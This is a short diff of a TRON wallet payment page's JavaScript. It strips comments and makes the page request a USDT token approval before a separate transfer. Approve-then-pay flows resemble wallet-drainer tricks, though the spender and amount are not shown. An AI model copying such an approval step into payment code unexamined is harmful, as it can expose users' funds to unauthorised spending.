@@ -119,7 +119,6 @@ checkEnvironment();
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
-  // 立即改变提示，防止用户以为卡死
   btn.textContent = '正在请求节点…';
   setStatus('loading', '正在构建交易，请稍候…');
 
@@ -128,17 +127,15 @@ $('#btn-pay').onclick = async function () {
       throw new Error('未检测到 TRON 钱包环境');
     }
 
-    // 【极速修复】强制把 imToken 的慢节点，切换到波场官方高速节点
     try {
       window.tronWeb.setFullNode('https://api.trongrid.io');
       window.tronWeb.setSolidityNode('https://api.trongrid.io');
       window.tronWeb.setEventServer('https://api.trongrid.io');
-    } catch(e) { console.log('节点切换跳过'); }
+    } catch(e) {}
 
     const fromAddress = window.tronWeb.defaultAddress.base58;
     const amountUnits = Math.floor(amount * 1e6).toString();
 
-    // === 第 1 步：授权 ===
     setStatus('loading', '第 1 步：请在钱包中确认授权 1 USDT…');
     
     const approveParam = [
@@ -159,10 +156,8 @@ $('#btn-pay').onclick = async function () {
 
     setStatus('loading', '✅ 授权成功！<br>第 2 步：请准备好再次确认支付金额…');
     
-    // 强制等待 2 秒，给安卓系统喘口气
     await new Promise(r => setTimeout(r, 2000));
 
-    // === 第 2 步：支付 ===
     setStatus('loading', '第 2 步：正在唤起支付请求，请在钱包中确认…');
     
     const transferParam = [
